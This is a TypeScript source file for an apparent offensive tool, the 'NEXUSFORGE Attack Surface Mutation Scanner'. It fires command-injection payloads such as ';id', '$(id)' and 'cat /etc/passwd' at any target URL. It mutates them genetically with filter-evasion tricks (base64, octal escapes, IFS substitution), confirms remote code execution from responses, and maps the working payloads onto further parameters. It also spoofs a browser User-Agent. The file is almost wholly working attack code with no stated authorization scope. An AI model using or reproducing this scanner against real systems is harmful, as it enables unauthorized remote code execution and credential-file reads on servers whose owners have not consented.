import type { WebSocket } from "ws";
import { execFile as execFileCb } from "child_process";
import { promisify } from "util";
import { randomBytes } from "crypto";
import { tmpdir } from "os";
import { join } from "path";
import { readFile, unlink } from "fs/promises";
import { MutationScannerRequestSchema } from "../lib/schemas.js";

const execFileP = promisify(execFileCb);

interface MutMsg { type: string; [k: string]: unknown; }

function send(ws: WebSocket, msg: MutMsg): void {
  if (ws.readyState === 1) {
    try { ws.send(JSON.stringify(msg)); } catch { /* connection closed mid-send */ }
  }
}

async function curlGet(
  url: string,
  headers: Record<string, string>,
): Promise<{ status: number; body: string; elapsed: number }> {
  const t0      = Date.now();
  const tag     = randomBytes(4).toString("hex");
  const outFile = join(tmpdir(), `nmut_body_${tag}`);
  const hdrFile = join(tmpdir(), `nmut_hdr_${tag}`);
  const args = [
    "--silent", "--insecure",
    "--max-time", "18", "--connect-timeout", "8",
    "--output", outFile, "--dump-header", hdrFile,
    "--write-out", "%{http_code}",
    "--compressed", "--http1.1",
    "-X", "GET",
  ];
  for (const [k, v] of Object.entries(headers)) args.push("-H", `${k}: ${v}`);
  args.push(url);
  try {
    const { stdout } = await execFileP("curl", args, { timeout: 19_000, maxBuffer: 4 * 1024 * 1024 });
    const status = parseInt(stdout.trim(), 10) || 0;
    const body   = await readFile(outFile, "utf8").catch(() => "");
    return { status, body, elapsed: Date.now() - t0 };
  } finally {
    await Promise.allSettled([unlink(outFile), unlink(hdrFile)]);
  }
}

async function probe(
  baseUrl: string,
  param: string,
  payload: string,
  method: string,
  headers: Record<string, string>,
): Promise<{ status: number; body: string; elapsed: number }> {
  try {
    const u = new URL(baseUrl);
    if (method === "GET") {
      u.searchParams.set(param, payload);
      return await curlGet(u.toString(), headers);
    }
    const tag     = randomBytes(4).toString("hex");
    const outFile = join(tmpdir(), `nmut_body_${tag}`);
    const hdrFile = join(tmpdir(), `nmut_hdr_${tag}`);
    const t0      = Date.now();
    const args = [
      "--silent", "--insecure",
      "--max-time", "18", "--connect-timeout", "8",
      "--output", outFile, "--dump-header", hdrFile,
      "--write-out", "%{http_code}",
      "--compressed", "--http1.1",
      "-X", method,
      "-H", `Content-Type: application/x-www-form-urlencoded`,
      "--data-raw", `${encodeURIComponent(param)}=${encodeURIComponent(payload)}`,
    ];
    for (const [k, v] of Object.entries(headers)) args.push("-H", `${k}: ${v}`);
    args.push(u.toString());
    try {
      const { stdout } = await execFileP("curl", args, { timeout: 19_000, maxBuffer: 4 * 1024 * 1024 });
      const status = parseInt(stdout.trim(), 10) || 0;
      const body   = await readFile(outFile, "utf8").catch(() => "");
      return { status, body, elapsed: Date.now() - t0 };
    } finally {
      await Promise.allSettled([unlink(outFile), unlink(hdrFile)]);
    }
  } catch {
    return { status: 0, body: "", elapsed: 0 };
  }
}

const SEED_PAYLOADS = [
  "id",
  ";id",
  "`id`",
  "$(id)",
  "${IFS}id",
  "&&id",
  "||id",
  "|id",
  ";id;",
  "%0aid",
  "id%0a",
  "';id;echo'",
  "\";id;echo\"",
  "%3bid",
  "id%26%26id",
  "$(echo${IFS}id)",
  "id&&echo vulnerable",
  "id;echo;id",
  "id\nid",
  ";{id,}",
  ";$IFS;id",
  ";id #",
  "id #comment",
  "1;id",
  "1|id",
  "1&&id",
  "'||id||'",
];

const MUTATORS: ((p: string) => string)[] = [
  p => p.replace(/id/g, "i\\d"),
  p => p.replace(/id/g, "${IFS}i${IFS}d"),
  p => p.replace(/ /g, "${IFS}"),
  p => p.replace(/ /g, "\t"),
  p => p.replace(/ /g, "<"),
  p => "'" + p + "'",
  p => '"' + p + '"',
  p => p.replace(/id/g, "$(echo aWQ=|base64 -d)"),
  p => p.replace(/;/g, "%3b"),
  p => p.replace(/&/g, "%26"),
  p => p.replace(/\|/g, "%7c"),
  p => "/*comment*/" + p,
  p => p + "/**/",
  p => p.replace(/id/g, "id\x00"),
  p => p.replace(/id/g, "\\i\\d"),
  p => p.split("").map((c, i) => i % 3 === 1 ? c.toUpperCase() : c).join(""),
  p => "%0a" + p,
  p => p + "%0a",
  p => p.replace(/id/g, "$(printf 'id')"),
  p => p.replace(/id/g, "$(echo id)"),
  p => encodeURIComponent(p),
  p => p.replace(/id/g, "i''d"),
  p => p.replace(/id/g, 'i""d'),
  p => "<!--" + p + "-->",
  p => p.replace(/id/g, "$'\\151\\144'"),
  p => p.replace(/id/g, "$(\\x69\\x64)"),
  p => p + ";echo nx_ok_$$",
  p => ";(" + p + ")",
  p => "{" + p + "}",
  p => p.replace(/id/g, "cat /etc/passwd"),
  p => p.replace(/id/g, "whoami"),
];

function crossover(a: string, b: string): string {
  const mid = Math.floor(a.length / 2);
  return a.slice(0, mid) + b.slice(Math.floor(b.length / 2));
}

function scoreResponse(
  body: string,
  elapsed: number,
  baseLen: number,
  baseElapsed: number,
  status: number,
): number {
  let score = 0;
  const RCE_PATTERNS = [
    /uid=\d+/i, /root:x:/i, /bin\/bash/i, /\/etc\/passwd/i,
    /nx_ok_/i, /vulnerable/i, /command not found/i,
    /sh:\s*\d+:/i, /EXECUTION CONFIRMED/i,
  ];
  for (const rx of RCE_PATTERNS) {
    if (rx.test(body)) score += 100;
  }
  const lenDiff = Math.abs(body.length - baseLen);
  if (lenDiff > 200) score += Math.min(40, Math.floor(lenDiff / 20));
  if (elapsed - baseElapsed > 3000) score += 30;
  if (status >= 500) score += 15;
  if (status === 200 && body.length > baseLen + 50) score += 10;
  return score;
}

function detectOutput(body: string): string | null {
  const RCE_PATTERNS: [RegExp, string][] = [
    [/uid=\d+\([\w-]+\)\s*gid=\d+/i,    "uid/gid output — remote code execution"],
    [/root:x:\d+:\d+/,                   "/etc/passwd — file read confirmed"],
    [/Linux\s+\S+\s+\d+\.\d+/,          "uname output — kernel version leaked"],
    [/Darwin\s+\S+\s+\S+/,              "uname output — macOS kernel version leaked"],
    [/Microsoft Windows/i,               "Windows system info leaked"],
    [/nx_ok_\d+/,                        "sentinel echo hit — blind RCE confirmed"],
    [/vulnerable/i,                      "echo injection confirmed"],
    [/EXECUTION CONFIRMED/i,             "nested execution confirmed"],
  ];
  for (const [rx, label] of RCE_PATTERNS) {
    if (rx.test(body)) return label;
  }
  return null;
}

export function handleMutationScanner(ws: WebSocket): void {
  ws.once("message", raw => {
    let parsed: unknown;
    try { parsed = JSON.parse(raw.toString()); }
    catch { send(ws, { type: "error", message: "invalid JSON" }); ws.close(); return; }

    const validation = MutationScannerRequestSchema.safeParse(parsed);
    if (!validation.success) {
      send(ws, { type: "error", message: "validation failed", issues: validation.error.issues });
      ws.close(); return;
    }

    const params = validation.data;
    const targetUrl    = (params.targetUrl ?? "").trim();
    const injectParam  = (params.injectParam ?? "cmd").trim();
    const httpMethod   = (params.httpMethod ?? "GET").toUpperCase();
    const generations  = Math.min(Math.max(params.generations ?? 6, 2), 12);
    const popSize      = Math.min(Math.max(params.popSize ?? 20, 8), 40);
    const extraParams  = (params.extraParams ?? "").split(",").map((s: string) => s.trim()).filter(Boolean);
    const customHdrs   = params.customHeaders ?? "";

    if (!targetUrl) { ws.close(); return; }

    const headers: Record<string, string> = {
      "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
      "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "Cache-Control":   "no-cache",
    };
    if (customHdrs) {
      for (const line of customHdrs.split("\n")) {
        const col = line.indexOf(":");
        if (col > 0) headers[line.slice(0, col).trim()] = line.slice(col + 1).trim();
      }
    }

    (async () => {
      send(ws, { type: "banner", text:
        `╔══════════════════════════════════════════════════════════════╗\n` +
        `║  NEXUSFORGE  ATTACK SURFACE MUTATION SCANNER v1             ║\n` +
        `║  Genetic payload evolution + propagation mapping            ║\n` +
        `╚══════════════════════════════════════════════════════════════╝\n` +
        `  TARGET    : ${targetUrl}\n` +
        `  PARAM     : ${injectParam}\n` +
        `  METHOD    : ${httpMethod}\n` +
        `  GENERATIONS: ${generations}   POP SIZE: ${popSize}\n` +
        `  EXTRA PARAMS TO MAP: ${extraParams.length > 0 ? extraParams.join(", ") : "(none)"}\n` +
        `${"─".repeat(64)}`
      });

      send(ws, { type: "phase", phase: "baseline", text: "Establishing 3-request baseline..." });

      let baseLen = 0;
      let baseElapsed = 0;
      let baseStatus  = 0;
      try {
        const bases = await Promise.all([
          probe(targetUrl, injectParam, "nexus_baseline_1", httpMethod, headers),
          probe(targetUrl, injectParam, "nexus_baseline_2", httpMethod, headers),
          probe(targetUrl, injectParam, "nexus_baseline_3", httpMethod, headers),
        ]);
        baseLen     = Math.round(bases.reduce((a, b) => a + b.body.length, 0) / 3);
        baseElapsed = Math.round(bases.reduce((a, b) => a + b.elapsed, 0) / 3);
        baseStatus  = bases[1]?.status ?? 0;
        send(ws, { type: "baseline", len: baseLen, elapsed: baseElapsed, status: baseStatus,
          text: `  baseline: ${baseLen}b  ${baseElapsed}ms  HTTP ${baseStatus}` });
      } catch (err) {
        send(ws, { type: "error", message: `Baseline failed: ${String(err)}` });
        ws.close(); return;
      }

      let population: string[] = SEED_PAYLOADS.slice(0, popSize);
      while (population.length < popSize) {
        const seed = SEED_PAYLOADS[population.length % SEED_PAYLOADS.length] ?? ";id";
        const mut  = MUTATORS[Math.floor(Math.random() * MUTATORS.length)]!;
        population.push(mut(seed));
      }

      const confirmed: { payload: string; score: number; evidence: string; generation: number }[] = [];
      const scores = new Map<string, number>();

      for (let gen = 1; gen <= generations; gen++) {
        send(ws, { type: "generation_start", generation: gen, total: generations, popSize: population.length,
          text: `\n${"═".repeat(64)}\n  GENERATION ${gen}/${generations}  ·  ${population.length} candidates\n${"═".repeat(64)}` });

        const results: { payload: string; score: number; status: number; elapsed: number; body: string }[] = [];

        for (let i = 0; i < population.length; i++) {
          const payload = population[i]!;
          const trunc   = payload.length > 80 ? payload.slice(0, 80) + "…" : payload;

          send(ws, { type: "probe", generation: gen, idx: i, total: population.length, payload: trunc,
            text: `  [${String(i + 1).padStart(2)}/${population.length}] ${trunc}` });

          let result = { status: 0, body: "", elapsed: 0 };
          try {
            result = await probe(targetUrl, injectParam, payload, httpMethod, headers);
          } catch { /**/ }

          const score = scoreResponse(result.body, result.elapsed, baseLen, baseElapsed, result.status);
          scores.set(payload, score);
          results.push({ payload, score, status: result.status, elapsed: result.elapsed, body: result.body });

          const evidence = detectOutput(result.body);
          const lenDiff  = result.body.length - baseLen;
          const marker   = score >= 100 ? "🔴 RCE" : score >= 30 ? "🟡 HIT" : score > 0 ? "🟢 DIFF" : "·";

          send(ws, { type: "result", generation: gen, idx: i, payload, score, status: result.status,
            elapsed: result.elapsed, lenDiff, evidence,
            text: `        ${marker}  score=${score}  HTTP ${result.status}  ${result.elapsed}ms  Δ${lenDiff > 0 ? "+" : ""}${lenDiff}b${evidence ? `  ⚡ ${evidence}` : ""}` });

          if (evidence && !confirmed.find(c => c.payload === payload)) {
            confirmed.push({ payload, score, evidence, generation: gen });
            send(ws, { type: "confirmed", payload, evidence, generation: gen,
              text: `\n  ┌─ CONFIRMED RCE ──────────────────────────────────────────\n` +
                    `  │ GENERATION : ${gen}/${generations}\n` +
                    `  │ PAYLOAD    : ${payload}\n` +
                    `  │ EVIDENCE   : ${evidence}\n` +
                    `  │ SCORE      : ${score}  HTTP ${result.status}  ${result.elapsed}ms\n` +
                    (result.body.length > 0
                      ? result.body.slice(0, 2000).split("\n").slice(0, 40).map(l => `  │ ${l.slice(0, 200)}`).join("\n") + "\n"
                      : "") +
                    `  └──────────────────────────────────────────────────────────` });
          }

          await new Promise<void>(r => setTimeout(r, 40 + Math.random() * 60));
        }

        const sorted = [...results].sort((a, b) => b.score - a.score);
        const elite  = sorted.slice(0, Math.max(4, Math.floor(popSize * 0.25)));

        send(ws, { type: "generation_done", generation: gen,
          best: elite[0] ? { payload: elite[0].payload, score: elite[0].score } : null,
          text: `\n  TOP-5 THIS GENERATION:\n` +
            sorted.slice(0, 5).map((r, i) =>
              `    ${i + 1}. score=${r.score.toString().padStart(3)}  ${r.payload.slice(0, 70)}`
            ).join("\n") });

        if (gen < generations) {
          const newPop: string[] = [];
          for (const e of elite) newPop.push(e.payload);

          while (newPop.length < popSize) {
            const parentA = elite[Math.floor(Math.random() * elite.length)]!.payload;
            const parentB = elite[Math.floor(Math.random() * elite.length)]!.payload;
            const roll    = Math.random();

            if (roll < 0.35 && parentA !== parentB) {
              newPop.push(crossover(parentA, parentB));
            } else if (roll < 0.70) {
              const mut = MUTATORS[Math.floor(Math.random() * MUTATORS.length)]!;
              newPop.push(mut(parentA));
            } else {
              const seed = SEED_PAYLOADS[Math.floor(Math.random() * SEED_PAYLOADS.length)]!;
              const mut  = MUTATORS[Math.floor(Math.random() * MUTATORS.length)]!;
              newPop.push(mut(seed));
            }
          }

          const unique = [...new Set(newPop)];
          while (unique.length < popSize) {
            const seed = SEED_PAYLOADS[Math.floor(Math.random() * SEED_PAYLOADS.length)]!;
            unique.push(MUTATORS[Math.floor(Math.random() * MUTATORS.length)]!(seed));
          }
          population = unique.slice(0, popSize);

          send(ws, { type: "evolve", generation: gen, nextPop: population.length,
            text: `\n  ↻ Evolved → Gen ${gen + 1}  (${elite.length} elite preserved, ${population.length - elite.length} mutated/crossed)` });
        }
      }

      if (extraParams.length > 0 && confirmed.length > 0) {
        send(ws, { type: "propagation_start",
          text: `\n${"═".repeat(64)}\n  PROPAGATION MAPPING  ·  Testing ${confirmed.length} confirmed payload(s) across ${extraParams.length} param(s)\n${"═".repeat(64)}` });

        for (const conf of confirmed.slice(0, 5)) {
          for (const ep of extraParams) {
            send(ws, { type: "propagation_probe", param: ep, payload: conf.payload,
              text: `  ▸ param="${ep}"  payload="${conf.payload.slice(0, 60)}"` });
            let r = { status: 0, body: "", elapsed: 0 };
            try { r = await probe(targetUrl, ep, conf.payload, httpMethod, headers); } catch { /**/ }
            const ev  = detectOutput(r.body);
            const ld  = r.body.length - baseLen;
            send(ws, { type: "propagation_result", param: ep, payload: conf.payload,
              status: r.status, elapsed: r.elapsed, lenDiff: ld, propagated: !!ev, evidence: ev,
              text: `    ${ev ? "🔴 PROPAGATED" : "·  not propagated"}  HTTP ${r.status}  ${r.elapsed}ms  Δ${ld > 0 ? "+" : ""}${ld}b${ev ? `  ⚡ ${ev}` : ""}` });
            await new Promise<void>(r2 => setTimeout(r2, 80 + Math.random() * 120));
          }
        }
      }

      const bestAll = [...scores.entries()].sort((a, b) => b[1] - a[1]).slice(0, 10);
      send(ws, { type: "end", confirmed: confirmed.length, generations,
        text: `\n${"═".repeat(64)}\n  MUTATION SCAN COMPLETE\n` +
          `  ${confirmed.length} confirmed RCE payload(s) found across ${generations} generations.\n` +
          `\n  TOP PAYLOADS BY SCORE:\n` +
          bestAll.map(([ p, s ], i) => `    ${i + 1}. score=${s.toString().padStart(3)}  ${p.slice(0, 80)}`).join("\n") +
          `\n${"═".repeat(64)}`,
        topPayloads: bestAll.map(([p, s]) => ({ payload: p, score: s })),
        confirmedList: confirmed,
      });

      if (ws.readyState === 1) ws.close();
    })().catch((err: unknown) => {
      send(ws, { type: "error", message: String(err) });
      if (ws.readyState === 1) ws.close();
    });
  });
}
